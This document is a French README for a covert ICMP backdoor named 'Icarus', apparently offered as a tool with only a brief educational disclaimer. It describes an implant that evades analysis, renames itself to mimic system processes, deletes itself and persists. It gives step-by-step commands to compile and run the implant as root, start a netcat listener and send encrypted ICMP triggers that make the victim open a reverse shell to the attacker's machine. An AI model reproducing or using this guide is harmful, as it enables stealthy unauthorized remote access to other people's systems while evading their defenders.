
# Icarus Backdoor

**AVERTISSEMENT :** Ce projet est fourni à des fins éducatives uniquement. Utilisez-le uniquement dans des environnements de test contrôlés avec une autorisation explicite. Toute utilisation non autorisée est strictement illégale.

---

## Aperçu

Ce projet implémente une porte dérobée ICMP autonome, multiplateforme et très discrète. La porte dérobée écoute les paquets ICMP Echo spécialement conçus contenant des commandes chiffrées. À la réception d'un paquet valide, elle peut exécuter un shell inversé ou changer son état (par exemple, passer en mode veille pour masquer sa présence). Les communications sont sécurisées à l'aide de AES-256-GCM avec une clé dérivée dynamiquement via PBKDF2. Le projet intègre également des techniques anti-analyse, anti-débogage et d'auto-suppression pour minimiser son empreinte et échapper à la détection.

---

## Fonctionnalités Clés

- **Chiffrement Robuste & Dérivation de Clé Dynamique :**
  - Utilise AES-256-GCM pour chiffrer et authentifier la charge utile.
  - La clé AES est dérivée dynamiquement via PBKDF2 à partir d'un secret pré-partagé obfusqué.
  - Chaque charge utile utilise un sel aléatoire, garantissant un chiffrement unique pour chaque transmission.

- **Traitement des Commandes avec Fonctionnalité Veille/Réveil :**
  - Accepte les commandes intégrées dans la charge utile ICMP.
  - **Commande de Shell Inversé :**
    Format : `<SECRET> <reverse_ip> <reverse_port>`
    Déclenche une connexion de shell inversé de la victime à l'attaquant.
  - **Commande de Veille :**
    Format : `<SECRET> sleep [duration]`
    Met la porte dérobée en mode veille profonde (se cache en se renommant en "init") et arrête d'exécuter les commandes de shell inversé jusqu'à la réception d'une commande de réveil.
  - **Commande de Réveil :**
    Format : `<SECRET> wake`
    Réactive la porte dérobée si elle est en mode veille.

- **Techniques Anti-Débogage & Anti-VM Avancées :**
  - Vérifie la présence de débogueurs actifs via `/proc/self/status` sur Unix ou `IsDebuggerPresent()` sur Windows.
  - Mesure le temps d'exécution pour détecter des délais anormaux pouvant indiquer un débogage.
  - Sur Unix, analyse `/proc/cpuinfo` pour détecter des indicateurs d'hyperviseur (par exemple, VirtualBox, VMware) afin de repérer les environnements virtuels.
  - Si une activité suspecte est détectée, la porte dérobée déclenche une routine d'auto-destruction pour effacer les données sensibles et se terminer.

- **Renommage Dynamique des Processus & Obfuscation :**
  - Sur Unix, le processus se renomme dynamiquement en utilisant un nom aléatoire choisi parmi une liste de processus système plausibles (par exemple, "svchost", "launchd", "cron", "udevd", etc.) avec un horodatage ajouté.
  - En mode veille, le processus se renomme en un nom générique comme "init" pour se fondre parmi les processus système légitimes.

- **Supervision Autonome & Auto-Suppression :**
  - Un processus parent supervise l'écouteur ICMP et le redémarre en cas de plantage, assurant ainsi la persistance.
  - La porte dérobée tente de supprimer son propre binaire du disque au démarrage (auto-suppression) pour réduire son empreinte sur le disque.

- **Génération de Trafic Leurre :**
  - Un thread dédié envoie périodiquement des paquets ICMP ping légitimes (par exemple, vers localhost) pour masquer le trafic malveillant parmi l'activité réseau normale.

- **Support Multiplateforme :**
  - Le code est compilé conditionnellement pour supporter Windows (en utilisant Winsock, CreateProcess, etc.) et les systèmes basés sur Unix (en utilisant fork, dup2, execl, prctl, et pthreads).
  - Le shell invoqué est choisi en fonction de la plateforme :
    - Windows : `cmd.exe`
    - macOS : `/bin/zsh`
    - BSD : `/bin/sh`
    - Linux : `/bin/bash`

---

## Structure du Projet

- **victim_backdoor.c**
  Contient le code source de la porte dérobée côté victime. Elle écoute les paquets ICMP, déchiffre la charge utile, traite les commandes (shell inversé, veille, réveil) et emploie des techniques avancées de discrétion et d'anti-analyse. Elle inclut également des fonctionnalités de supervision autonome et d'auto-suppression.

- **attacker_trigger.py**
  Un script Python utilisé par l'attaquant pour générer et envoyer le paquet déclencheur ICMP. Il construit une commande en texte clair, la chiffre à l'aide de AES-256-GCM (avec une clé dérivée via PBKDF2) et envoie le paquet après un délai aléatoire.

- **README.txt**
  Ce fichier.

---

## Prérequis

### Machine Victime

- Système d'exploitation : Linux, BSD, macOS ou Windows.
- Privilèges root/administrateur requis pour ouvrir des sockets brutes.
- OpenSSL (libcrypto) doit être installé.
- Sur Unix, pthreads et prctl (pour le renommage des processus) doivent être disponibles.

### Machine Attaquante

- Python 3.x
- Le module Python `cryptography` (installer via `pip install cryptography`)
- Privilèges administrateur/root pour envoyer des paquets ICMP bruts.
- Un outil tel que netcat (`nc`) pour capturer le shell inversé.

---

## Installation

### Machine Victime

#### Sur Unix (Linux, BSD, macOS)

1. **Compiler la Porte Dérobée :**
   ```bash
   gcc -Wall -Wextra -O2 -D_FORTIFY_SOURCE=2 -o victim_backdoor victim_backdoor.c -lcrypto -lpthread
   ```

2. **Exécuter la Porte Dérobée en tant que Root :**
   ```bash
   sudo ./victim_backdoor
   ```
   Le binaire va déchiffrer la clé secrète, se renommer dynamiquement, tenter l'auto-suppression et commencer à écouter les paquets ICMP.

3. **Afficher la Configuration (Optionnel) :**
   ```bash
   ./victim_backdoor -v
   ```

#### Sur Windows

1. **Compiler la Porte Dérobée (en utilisant MinGW) :**
   ```bash
   gcc -Wall -Wextra -O2 -o victim_backdoor.exe victim_backdoor.c -lws2_32 -lcrypto
   ```

2. **Exécuter la Porte Dérobée en tant qu'Administrateur.**

### Machine Attaquante

1. **Installer le Module Cryptography :**
   ```bash
   pip install cryptography
   ```

2. **Préparer le Script Attaquant :** Placez `attacker_trigger.py` dans un répertoire.

---

## Tutoriel Simple

### Étape 1 : Démarrer la Porte Dérobée Victime

Sur la Machine Victime :

- Exécutez le binaire de la porte dérobée en tant que root :
  ```bash
  sudo ./victim_backdoor
  ```
  La porte dérobée s'exécutera en arrière-plan, déchiffrera sa clé secrète, se renommera, tentera l'auto-suppression et écoutera les paquets ICMP. Elle enverra également des pings leurres pour masquer son activité.

### Étape 2 : Préparer l'Environnement Attaquant

Sur la Machine Attaquante :

- Ouvrez un terminal et démarrez un écouteur en utilisant netcat sur le port 4444 :
  ```bash
  nc -lvnp 4444
  ```

### Étape 3 : Déclencher la Porte Dérobée

- **Pour Initier un Shell Inversé :**
  Exécutez le script attaquant avec l'IP de la victime, votre IP et le port de l'écouteur :
  ```bash
  sudo ./attacker_trigger.py 192.168.1.10 192.168.1.100 4444
  ```
  Paramètres :
  - `192.168.1.10` : IP de la machine victime.
  - `192.168.1.100` : IP de la machine attaquante.
  - `4444` : Port sur lequel votre écouteur est en cours d'exécution.

- **Pour Mettre la Porte Dérobée en Veille :**
  Envoyez une commande de veille pour mettre la porte dérobée en veille profonde (se cachant) :
  ```bash
  sudo ./attacker_trigger.py 192.168.1.10 sleep 300
  ```
  La porte dérobée entrera en mode veille pendant 300 secondes (ou indéfiniment si aucune durée n'est spécifiée), se renommant en "init" et ignorant les commandes de shell inversé.

- **Pour Réveiller la Porte Dérobée :**
  Envoyez une commande de réveil :
  ```bash
  sudo ./attacker_trigger.py 192.168.1.10 wake 0
  ```

### Étape 4 : Obtenir le Shell Inversé

Lorsque la porte dérobée victime traite la commande de shell inversé, elle se connectera à l'IP et au port spécifiés par l'attaquant. Votre écouteur netcat recevra la connexion, vous accordant un shell interactif sur la machine victime.

### Étape 5 : Supervision & Persistance

La porte dérobée est continuellement supervisée par un processus parent qui la redémarre en cas de plantage. L'auto-suppression minimise l'empreinte sur le disque. Le trafic leurre aide à masquer les communications ICMP malveillantes.

---

## Détails Techniques

- **Chiffrement & Dérivation de Clé :**
  Chaque charge utile est chiffrée avec AES-256-GCM en utilisant une clé dérivée dynamiquement d'un secret pré-partagé (obfusqué dans le binaire) et d'un sel aléatoire. Cela garantit que chaque communication est unique.

- **Anti-Débogage & Anti-VM :**
  La porte dérobée emploie plusieurs vérifications (détection de débogueur, analyse du temps d'exécution, indicateurs d'hyperviseur) et s'auto-détruit si une activité suspecte est détectée.

- **Renommage Dynamique des Processus :**
  Le processus est renommé dynamiquement pour se fondre parmi les processus système légitimes. En mode veille, il se renomme en "init" pour apparaître comme un processus système standard.

- **Fonctionnalité Veille/Réveil :**
  La porte dérobée peut être commandée pour entrer en mode veille, où elle cesse l'activité de shell inversé et minimise sa visibilité. Elle ne traite que la commande "wake" lorsqu'elle est dormante.

- **Supervision Autonome & Auto-Suppression :**
  Une boucle de supervision assure que si l'écouteur s'arrête, il est automatiquement redémarré. Le binaire tente de se supprimer du disque au démarrage pour une discrétion accrue.

- **Trafic Leurre :**
  Un thread leurre génère un trafic ICMP légitime (pings vers localhost) pour obscurcir les paquets malveillants.

---

## Avertissement

Ce projet est destiné uniquement à des fins éducatives et de recherche dans des environnements contrôlés. L'utilisation abusive de cet outil sur des systèmes non autorisés est illégale et contraire à l'éthique.

---
